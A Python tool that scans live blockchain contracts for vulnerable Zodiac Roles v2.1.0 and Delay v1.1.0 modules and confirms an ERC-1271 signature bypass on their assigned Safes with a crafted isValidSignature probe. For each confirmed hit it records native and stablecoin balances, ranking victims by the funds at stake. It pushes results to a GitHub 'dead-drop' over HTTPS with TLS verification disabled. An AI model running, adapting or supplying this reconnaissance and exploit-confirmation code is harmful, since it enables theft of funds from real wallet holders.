#!/usr/bin/env python3
"""
zgate_remote — standalone Zodiac ERC-1271 bypass gate (stdlib ONLY, direct egress).
Canonical rule (Gnosis post-mortem §2.1/§4): affected mastercopy (Roles v2.1.0 /
Delay v1.1.0) AND an assigned CompatibilityFallbackHandler-Safe whose composed
isValidSignature call leaks 0x1626ba7e. Flag = leak reproduced live.
Outputs per-shard ndjson + STATUS heartbeat in --outdir.
"""
import argparse, json, os, sys, time, threading, random, itertools
from concurrent.futures import ThreadPoolExecutor
import urllib.request, urllib.error, ssl
_SSLCtx = ssl.create_default_context()
try:
    _SSLCtx.check_hostname = False
    _SSLCtx.verify_mode = ssl.CERT_NONE
except Exception:
    pass

# ---------------------------------------------------------------- keccak256
_MASK = (1 << 64) - 1
RC = [0x0000000000000001,0x0000000000008082,0x800000000000808A,0x8000000080008000,
      0x000000000000808B,0x0000000080000001,0x8000000080008081,0x8000000000008009,
      0x000000000000008A,0x0000000000000088,0x0000000080008009,0x000000008000000A,
      0x000000008000808B,0x800000000000008B,0x8000000000008089,0x8000000000008003,
      0x8000000000008002,0x8000000000000080,0x000000000000800A,0x800000008000000A,
      0x8000000080008081,0x8000000000008080,0x0000000080000001,0x8000000080008008]

ROTC = [[0,36,3,41,18],[1,44,10,45,2],[62,6,43,15,61],[28,55,25,21,56],[27,20,39,8,14]]

def _rol(v, n):
    n %= 64
    return (((v << n) | (v >> (64 - n))) & _MASK) if n else v

def _round(a):
    c = [(a[x] ^ a[x+5] ^ a[x+10] ^ a[x+15] ^ a[x+20]) & _MASK for x in range(5)]
    d = [(c[(x-1) % 5] ^ _rol(c[(x+1) % 5], 1)) & _MASK for x in range(5)]
    for y in range(5):
        for x in range(5):
            a[x+5*y] ^= d[x]
    b = [0]*25
    for y in range(5):
        for x in range(5):
            nx, ny = y, (2*x + 3*y) % 5
            b[nx + 5*ny] = _rol(a[x + 5*y], ROTC[x][y])
    for y in range(5):
        for x in range(5):
            a[x + 5*y] = (b[x + 5*y] ^ ((~b[(x+1) % 5 + 5*y]) & b[(x+2) % 5 + 5*y])) & _MASK
    a[0] ^= RC[_round.n]
    _round.n += 1
_round.n = 0

def keccak256(data: bytes) -> str:
    rate = 136
    pad = bytearray(data) + b"\x01"
    while len(pad) % rate != 0:
        pad += b"\x00"
    pad[-1] ^= 0x80
    st = [0]*25
    for off in range(0, len(pad), rate):
        blk = pad[off:off+rate]
        for i in range(rate // 8):
            st[i] ^= int.from_bytes(blk[i*8:i*8+8], "little")
        _round.n = 0
        for _ in range(24):
            _round(st)
    out=b"".join(st[i].to_bytes(8,"little") for i in range(4))
    return "0x" + out.hex()

def sel(sig): return keccak256(sig.encode())[:10]

# ---- boot-time crypto self-test (hard abort on mismatch) -------------------
def _selftest():
    assert keccak256(b"") == "0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470", "keccak empty FAIL"
    assert keccak256(b"abc") == "0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45", "keccak abc FAIL"
    assert sel("transfer(address,uint256)") == "0xa9059cbb", "selector FAIL"
    assert sel("balanceOf(address)") == "0x70a08231", "selector2 FAIL"

# --------------------------------------------------------------- constants
SENTINEL = "0x" + "00"*19 + "01"
FALLBACK_SLOT = "0x6c9a6c4a39284e37ed1cf53d337577d14212a4870fb976a4366c693b939918d5"
SEL_MODULES = None
SEL_AVATAR  = None
SEL_BALANCE = None
SEL_ISVALID = None

AFFECTED_ADDR = {"0x9646fdad06d3e24444381f44362a3b0eb343d337",
                 "0x01f8cabb808d7de0df4202d4b60c8310d2f1339b"}
VULN_HASHES = {
 "0x87911cbc6aa0496e6bcb07dab2462b9c76daea130dede6dcc57d0adf307fa7ec": "roles-2.1.0",
 "0xacfe2969dd5516ec08ca2347669ac722df65a7826aa4faa6aed07e97be02c0fd": "delay-1.1.0",
}
PATCHED_HASHES = {"0x471d8b3b419f1eb955230c0326c8812176df49bf3c7b414a563fda5a3c6c10b6",
                  "0xdd928eddfff7b68bd8fff28178c29e3388c1d098051d9262f151c4b534c577b8"}

WIN_HEX = ("0000000000000000000000005a77953caa27ed4638f4dfdc665b8064d0e97a3500000000000000000000000000000000000000000000000000000000000000820000000000000000000000000081ba8a2b895d30280bca199c2ff75f3f058d4c6c00000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000")


# ------------------------------------------------------------- outbound pusher
import socket as _sk
def _boxid():
    try: return (_sk.gethostname() or "bx")[:12].replace(".","_")
    except Exception: return "bx"

class Pusher(threading.Thread):
    """Mirror progress to a GitHub dead-drop over plain HTTPS."""
    def __init__(self,outdir,files,repo,tok,period=70):
        super().__init__(daemon=True)
        self.outdir=outdir; self.files=files; self.repo=repo; self.tok=tok
        self.period=period; self.stop=False; self.sha={}
        self.box=_boxid()
    def _put(self,name,data_bytes):
        import urllib.request, json as _j, base64 as _b
        url=f"https://api.github.com/repos/{self.repo}/contents/live/{name}"
        hd={"Authorization":"Bearer "+self.tok,"Accept":"application/vnd.github+json",
            "User-Agent":"zg"}
        body=_j.dumps({"message":f"{self.box}:{name}","content":_b.b64encode(data_bytes).decode(),
                       "branch":"main"} | ({"sha":self.sha[name]} if name in self.sha else {})).encode()
        rq=urllib.request.Request(url,data=body,headers=hd,method="PUT")
        try:
            with urllib.request.urlopen(rq,timeout=25) as r:
                d=_j.loads(r.read()); self.sha[name]=d["content"]["sha"]; return True
        except urllib.error.HTTPError as he:
            if he.code in (409,422):  # stale/missing sha -> refetch once
                try:
                    q=urllib.request.Request(url+"?ref=main",headers=hd)
                    with urllib.request.urlopen(q,timeout=20) as rr:
                        self.sha[name]=_j.loads(rr.read())["sha"]
                except Exception: self.sha.pop(name,None)
            elif he.code==401: self.tok=None
            return False
        except Exception: return False
    def snapshot_hb(self,state,todo_len,started):
        el=max(1,int(time.time()-started)); done=state["done"]
        rate=done/el; rem=todo_len-done
        eta=int(rem/rate) if rate>0 else -1
        import json as _j
        return _j.dumps({"box":self.box,"processed":done,"of":todo_len,
                         "pass":state["pass"],"near":state["near"],"unres":state["unres"],
                         "errs":_STATS["err"],"rate":round(rate,3),"eta_s":eta,
                         "ts":int(time.time()),"engine":"zg-remote-v1"},separators=(",",":")).encode()
    def snapshot_res(self):
        import os,gzip
        try:
            fn=self.files.get("results"); 
            data=open(fn,"rb").read()
            return gzip.compress(data,compresslevel=6)
        except Exception: return None
    def run(self):
        started=time.time(); last=-1
        while not self.stop and self.tok:
            time.sleep(self.period)
            st=self.state_ref[0]
            try: self._put(f"h_{self.box}.json", self.snapshot_hb(st,self.todo_len[0],started))
            except Exception: pass
            blob=self.snapshot_res()
            if blob is not None and len(blob)>last//2:
                try:
                    if self._put(f"r_{self.box}.ndjson.gz",blob): last=len(blob)*2
                except Exception: pass

RPCS = {
 "gnosis": ["https://rpc.gnosischain.com","https://gnosis-rpc.publicnode.com","https://gnosis.drpc.org"],
 "ethereum": ["https://eth.llamarpc.com","https://ethereum-rpc.publicnode.com","https://cloudflare-eth.com","https://eth.drpc.org"],
 "base": ["https://mainnet.base.org","https://base-rpc.publicnode.com","https://base.drpc.org"],
 "arbitrum": ["https://arb1.arbitrum.io/rpc","https://arbitrum-one-rpc.publicnode.com","https://arbitrum.drpc.org"],
 "polygon": ["https://polygon-rpc.com","https://polygon-bor-rpc.publicnode.com","https://polygon.drpc.org"],
 "optimism": ["https://mainnet.optimism.io","https://optimism-rpc.publicnode.com"],
 "bsc": ["https://bsc-dataseed.binance.org","https://binance.llamarpc.com"],
}
TOKENS = {
 "gnosis": [("USDC",6,"0xddafbb505ad214d7b80b1f830fccc89b60fb7a83"),("USDT",6,"0x4ecaba5870353805a9f068101a40e0f32ed605c6"),
            ("WXDAI",18,"0xe91d153e0b41518a2ce8dd3d7944fa863463a97d"),("GNO",18,"0x9c58bacc331c9aa871afd802db6379a98e80cedb")],
 "ethereum":[("USDC",6,"0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48"),("USDT",6,"0xdac17f958d2ee523a2206206994597c13d831ec7"),
             ("DAI",18,"0x6b175474e89094c44da98b954eedeac495271d0f"),("WETH",18,"0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2")],
 "base":[("USDC",6,"0x833589fcd6edb6e08f4c7c32d4f71b54bda02913"),("WETH",18,"0x4200000000000000000000000000000000000006")],
 "arbitrum":[("USDC",6,"0xaf88d065e77c8cc2239327c5edb3a432268e5831"),("USDT",6,"0xfd086bc7cd5c481dcc9c85ebe478a1c0b69fcbb9"),
             ("WETH",18,"0x82af49447d8a07e3bd95bd0d56f35241523fbab1")],
 "polygon":[("USDC",6,"0x3c499c542cef5e3811e1192ce70d8cc03d5c3359"),("USDT",6,"0xc2132d05d31c914a87c6611c10748aeb04b58e8f"),
            ("WMATIC",18,"0x0d500b1d8e8ef31e21c99d1db9a6444d3adf1270")],
}

# ------------------------------------------------------------------ transport
_LOCK = threading.Lock()
_COOL = {}
_FAIL = {}
_STATS = {"req":0,"err":0}
_tokens_cap = 9.0; _tokens = 9.0

def _take(n=1, budget_s=8.0):
    """Token bucket that NEVER blocks longer than budget_s (deadlock-proof)."""
    global _tokens
    t0 = time.time()
    while True:
        with _LOCK:
            if _tokens >= n:
                _tokens -= n
                return True
        if time.time() - t0 > budget_s:
            with _LOCK:
                _tokens = float(max(1, n))
            return False
        time.sleep(0.01)


def _refill(rps):
    step = max(0.02, 1.0 / max(0.15, rps))
    while True:
        time.sleep(step)
        with _LOCK:
            _tokens = min(float(rps) * 2.0, _tokens + 1.0)


def _refill(rps):
    global _tokens
    while True:
        time.sleep(0.033)
        with _LOCK:
            _tokens = min(rps, _tokens + rps*0.0265)

_rr = {}

def _pick_url(ch):
    lst = RPCS.get(ch) or []
    if not lst: return None
    with _LOCK:
        idx = _rr.get(ch, 0); _rr[ch] = idx + 1
    now = time.time()
    alive = [u for u in lst if _COOL.get(u, 0) <= now]
    if not alive: 
        alive = lst
        for u in lst[:1]: _COOL[u] = now + 30
    return alive[idx % len(alive)]

LASTERR={"t":""}
def rpc_batch(ch, items, timeout=14, tries=3):
    """items=[(method,params),...] -> aligned list or None."""
    flat = [{"jsonrpc":"2.0","id":i,"method":m,"params":p} for i,(m,p) in enumerate(items)]
    body = json.dumps(flat if len(flat)>1 else flat[0]).encode()
    last = None
    for att in range(tries):
        url = _pick_url(ch)
        if not url: return None
        _take(max(1,len(items)//3))
        try:
            req = urllib.request.Request(url, data=body,
                headers={"Content-Type":"application/json",
                         "User-Agent":"curl/8.4.0","Accept":"application/json,*/*"},
                method="POST")
            with urllib.request.urlopen(req, timeout=timeout, context=_SSLCtx) as resp:
                txt = resp.read().decode(errors="ignore")
            arr = json.loads(txt)
            if isinstance(arr, dict): arr = [arr]
            got = {}
            for ent in arr:
                rid = ent.get("id")
                if rid is None: raise ValueError("bad id")
                got[int(rid)] = ent
            outs = []
            for i,_ in enumerate(flat):
                ent = got[i]
                if "result" in ent: outs.append(ent["result"])
                elif "error" in ent:
                    emsg = str(ent["error"].get("message","")).lower()
                    if any(k in emsg for k in ("limit","busy","429","rate")): raise RuntimeError("throttle")
                    outs.append({"__err__": ent["error"]})
                else: raise ValueError("empty")
            with _LOCK: _STATS["req"] += 1
            return outs
        except Exception as ex:
            last = ex
            LASTERR["t"]=repr(ex)[:140]
            with _LOCK:
                _FAIL[url] = _FAIL.get(url,0)+1
                if _FAIL[url] >= 4: _COOL[url] = time.time()+45; _FAIL[url] = 0
                _STATS["err"] += 1
            time.sleep(0.25*(att+1))
    return None

_cache_code = {}; _cache_hash = {}
_cl_lock = threading.Lock()

def get_code(ch, addr):
    o = rpc_batch(ch, [("eth_getCode",[addr,"latest"])])
    if o is None or not isinstance(o[0], str): return None
    return o[0]

def cached_code_hash(ch, addr):
    k=(ch,addr.lower())
    with _cl_lock:
        if k in _cache_hash: return _cache_hash[k]
    c=get_code(ch,addr)
    if c is None: return None
    h = "empty" if len(c)<=2 else keccak256(bytes.fromhex(c[2:]))
    with _cl_lock: _cache_hash[k]=h
    return h

def find_proxy_target(codehex):
    hx = codehex[2:]
    q = hx.find("363d3d373d3d3d363d73")
    if q>=0: return "0x"+hx[q+20:q+60]
    return None

def decode_modules(res):
    if not isinstance(res,str) or not res.startswith("0x"): return [],None
    h=res[2:]
    def word(i):
        seg=h[i*64:(i+1)*64]; return int(seg,16) if len(seg)==64 else None
    off=word(0)
    if off is None or off%32: return [],None
    base=off//32; ln=word(base)
    if ln is None or ln>800: return [],None
    mem=[]
    for k in range(ln):
        w=h[(base+1+k)*64:(base+2+k)*64]
        if len(w)!=64: return [],None
        mem.append("0x"+w[24:])
    nx_seg=h[(base+1+ln)*64:(base+2+ln)*64]
    nxt=("0x"+nx_seg[24:]) if len(nx_seg)==64 else None
    return mem,nxt

def enumerate_members(ch, mod):
    out=[]; start=SENTINEL; seen=set(); pages=0
    cntbig="%064x"%600
    while pages<8:
        o=rpc_batch(ch,[("eth_call",[{"to":mod,"data":SEL_MODULES+start[2:].rjust(64,"0")+cntbig},"latest"])])
        if o is None: break
        r=o[0]
        if isinstance(r,dict) and "__err__" in r: break
        mem,nxt=decode_modules(r)
        added=False
        for m in mem:
            ml=m.lower()
            if ml==SENTINEL or ml in seen: continue
            seen.add(ml); out.append(ml); added=True
        if not nxt or nxt.lower() in (SENTINEL,start.lower()) or not added: break
        start=nxt; pages+=1
    return out

# ------------------------------------------------------------------- evaluate
PROBE_CAP = 4

def eval_one(ch, addr, rec_out=None):
    rec={"chain":ch,"address":addr,"engine":"zg-remote-v1","ts":int(time.time())}
    chsh=cached_code_hash(ch,addr)
    if chsh is None: rec.update(v="UNRESOLVED",rc="CODE_TRANSPORT"); return rec
    if chsh=="empty": rec.update(v="REJECT",rc="NOT_CONTRACT"); return rec
    imp=None
    code=get_code(ch,addr)
    if isinstance(code,str): imp=find_proxy_target(code)
    tgt=imp if imp else addr
    fam=None
    if imp and imp.lower() in AFFECTED_ADDR:
        fam="roles-2.1.0" if imp.lower().startswith("0x9646") else "delay-1.1.0"
    if not fam:
        hsh=cached_code_hash(ch,tgt)
        if hsh and hsh in VULN_HASHES: fam=VULN_HASHES[hsh]
        elif hsh and hsh in PATCHED_HASHES: rec.update(v="REJECT",rc="PATCHED_BUILD"); return rec
    if not fam: rec.update(v="REJECT",rc="BUILD_NOT_AFFECTED"); return rec
    rec["build"]=fam

    mem=enumerate_members(ch,addr)
    if not mem: rec.update(v="REJECT",rc="NO_ASSIGNEES_FOUND"); return rec

    codes={}
    CH=15
    for bi in range(0,len(mem),CH):
        sl=mem[bi:bi+CH]
        rr=rpc_batch(ch,[("eth_getCode",[m,"latest"]) for m in sl]) or []
        for off,v in enumerate(rr[:len(sl)]):
            if isinstance(v,str): codes[sl[off].lower()]=v
    ptrs={}
    miss=[m for m in mem if m.lower() not in ptrs]
    for bi in range(0,len(miss),CH):
        sl=miss[bi:bi+CH]
        rr=rpc_batch(ch,[("eth_getStorageAt",[m,FALLBACK_SLOT,"latest"]) for m in sl]) or []
        for off,v in enumerate(rr[:len(sl)]):
            if isinstance(v,str) and len(v)>=66: ptrs[sl[off].lower()]="0x"+v[-40:]

    entries=[]
    for m in mem:
        cd=codes.get(m.lower())
        if not cd or cd=="0x":
            entries.append({"m":m,"cls":"eoa"}); continue
        p=ptrs.get(m.lower())
        cls = "noptr" if (p is None or p=="0x"+"00"*20) else "contract"
        entries.append({"m":m,"cls":cls,"fh":p})

    order=[e for e in entries if e["cls"]=="contract"]
    order.sort(key=lambda e: 0 if (e.get("fh") and e["fh"] not in ("0x"+"00"*20,"")) else 1)

    pad=((len(WIN_HEX)//2+31)//32)*32
    data=SEL_ISVALID+("11"*32)+(64).to_bytes(32,"big").hex()+(len(WIN_HEX)//2).to_bytes(32,"big").hex()+WIN_HEX.ljust(pad*2,"0")

    tried=0; proof=None
    for e in order:
        if tried>=PROBE_CAP: break
        tried+=1
        o=rpc_batch(ch,[("eth_call",[{"from":addr,"to":e["m"],"data":data},"latest"])])
        r=o[0] if o else None
        if isinstance(r,dict) and "__err__" in r:
            dd=str(r["__err__"].get("data") or "").lower()
            e["pc"]="magic_revert" if dd.startswith("0x1626ba7e") else f"revert:{dd[:10]}"
        elif isinstance(r,str):
            e["pc"]="magic_return" if r.lower().startswith("0x1626ba7e") else f"ret:{r[:10]}"
        else:
            e["pc"]="transport"
        if e["pc"] in ("magic_revert","magic_return"):
            proof=e; break

    rec["assignees"]=[{"m":e["m"],"cls":e["cls"],"fh":e.get("fh"),"pc":e.get("pc","not-tried")} for e in entries]
    if proof:
        rec.update(v="STRICT_PASS",rc="TWO_CONDITION_GATE_PROVEN_LIVE")
        rec["proof"]={"signer_safe":proof["m"],"observed":proof["pc"]}
        try:
            fu=gather_funding(ch,addr,[proof["m"]])
            rec["fl"]=fu
        except Exception:
            pass
    elif order:
        rec.update(v="NEAR_MISS",rc="CONTRACT_ASSIGNEE_NO_MAGIC_REPRODUCED")
    else:
        rec.update(v="REJECT",rc="EOA_ONLY_ASSIGNEES")
    return rec

def gather_funding(ch,mod_addr,signer_list):
    targets=[]
    seen=set()
    def add(a):
        if a and a.lower() not in seen: seen.add(a.lower()); targets.append(a)
    add(mod_addr)
    av=rpc_batch(ch,[("eth_call",[{"to":mod_addr,"data":SEL_AVATAR},"latest"])])
    try:
        v=av[0]
        if isinstance(v,str) and len(v)>=66:
            a="0x"+v[-40:]
            if a!="0x"+"00"*20: add(a)
    except Exception: pass
    for s in signer_list[:3]: add(s)
    out={}
    toks=TOKENS.get(ch,[])
    for t in targets:
        item={}
        bal=rpc_batch(ch,[("eth_getBalance",[t,"latest"])])
        if bal and isinstance(bal[0],str):
            try: item["native"]=int(bal[0],16)
            except Exception: pass
        for sym,dec,tka in toks:
            d=SEL_BALANCE+t[2:].rjust(64,"0")
            rr=rpc_batch(ch,[("eth_call",[{"to":tka,"data":d},"latest"])])
            if rr and isinstance(rr[0],str):
                try:
                    val=int(rr[0],16)
                    if val: item[sym]=val
                except Exception: pass
        out[t]=item
    return out

# ----------------------------------------------------------------------- main
def load_tasks(path, si, sn):
    rows=[]
    for l in open(path):
        l=l.strip()
        if not l or l.startswith("#"): continue
        parts=l.split("\t")
        if len(parts)<2: continue
        rows.append((parts[0].strip(), parts[1].strip()))
    rows=sorted(set(rows))
    mine=[t for i,t in enumerate(rows) if i%sn==si]
    return mine, len(rows)

def main():
    ap=argparse.ArgumentParser()
    ap.add_argument("--tasks",required=True)
    ap.add_argument("--slice",default="0/1")
    ap.add_argument("--workers",type=int,default=6)
    ap.add_argument("--rate",type=float,default=9.0)
    ap.add_argument("--outdir",default="/tmp/zgt-out")
    ap.add_argument("--maxtime",type=int,default=5400)
    ap.add_argument("--ghrepo",default="")
    ap.add_argument("--ghtok",default="")
    ap.add_argument("--pushsecs",type=int,default=75)
    a=ap.parse_args()
    _selftest()
    global SEL_MODULES,SEL_AVATAR,SEL_BALANCE,SEL_ISVALID
    SEL_MODULES=sel("getModulesPaginated(address,uint256)")
    SEL_AVATAR=sel("avatar()")
    SEL_BALANCE=sel("balanceOf(address)")
    SEL_ISVALID=sel("isValidSignature(bytes32,bytes)")

    os.makedirs(a.outdir,exist_ok=True)
    threading.Thread(target=_refill, args=(max(0.5,a.rate),), daemon=True).start()
    si,sn=[int(x) for x in a.slice.split("/")]
    todo,universe=load_tasks(a.tasks,si,sn)
    outf=os.path.join(a.outdir,f"RESULTS.s{si}.ndjson")
    statf=os.path.join(a.outdir,f"STATUS.s{si}")
    hbf  =os.path.join(a.outdir,f"HEARTBEAT.s{si}")
    donef=os.path.join(a.outdir,f"DONE.s{si}")

    STATE={"done":0,"pass":0,"near":0,"unres":0}
    STATE_HOLDER=[STATE]; TODO_LEN=[len(todo)]
    LK=threading.Lock()
    fl=open(outf,"a",buffering=1)
    stop={"v":False}; t_start=time.time()

    def writestatus(msg=""):
        tot=STATE["done"]
        el=max(1,int(time.time()-t_start))
        rate=tot/el
        rem=len(todo)-tot
        eta=int(rem/rate) if rate>0 else -1
        open(hbf,"w").write(f"{int(time.time())}\n")
        open(statf,"w").write(
          f"processed={tot}/{len(todo)} pass={STATE['pass']} near={STATE['near']} unres={STATE['unres']} "
          f"rate={rate:.2f}/s eta_s={eta} errs={_STATS['err']} lasterr={LASTERR['t'][:90]} {msg}\n")
    def hb():
        while not stop["v"]:
            time.sleep(25)
            with LK: writestatus("hb")
    th=threading.Thread(target=hb,daemon=True); th.start()

    def work(t):
        try:
            rec=eval_one(*t)
        except Exception as ex:
            rec={"chain":t[0],"address":t[1],"v":"ERROR","rc":repr(ex)[:120]}
        with LK:
            fl.write(json.dumps(rec,separators=(",",":"))+"\n")
            STATE["done"]+=1
            v=rec.get("v")
            if v=="STRICT_PASS":
                STATE["pass"]+=1
                pr=rec.get("proof",{}); fld=rec.get("fl",{}) or {}
                usd_hint=sum(sum(int(x) for x in (vv or {}).values()) for vv in fld.values() if isinstance(vv,dict)) if False else ""
                print(f"*** STRICT_PASS {rec['chain']} {rec['address']} signer={pr.get('signer_safe','')}",flush=True)
            elif v=="NEAR_MISS": STATE["near"]+=1
            elif v=="UNRESOLVED": STATE["unres"]+=1
            if STATE["done"]%25==0: writestatus()
        return rec

    if a.ghrepo and a.ghtok:
        try:
            P=Pusher(a.outdir,{"results":outf},a.ghrepo,a.ghtok,a.pushsecs)
            P.state_ref=STATE_HOLDER; P.todo_len=TODO_LEN
            P.start()
        except Exception as ex:
            print("[push] init fail:",ex,flush=True)
    pending=list(todo)
    rounds=0
    W=max(2,a.workers)
    while pending and rounds<4 and (time.time()-t_start)<a.maxtime:
        rounds+=1
        if rounds>1: time.sleep(min(90,15*(rounds-1)))
        left=[]
        with ThreadPoolExecutor(max_workers=W) as ex:
            for rec in ex.map(work,pending):
                if rec.get("v") in ("UNRESOLVED","ERROR"): left.append((rec["chain"],rec["address"]))
        pending=left
        writestatus(f"round{rounds}-end-left{len(left)}")

    stop["v"]=True
    with LK: writestatus("final")
    open(donef,"w").write(f"{int(time.time())} processed={STATE['done']} pass={STATE['pass']} universe={universe}\n")

if __name__=="__main__":
    main()
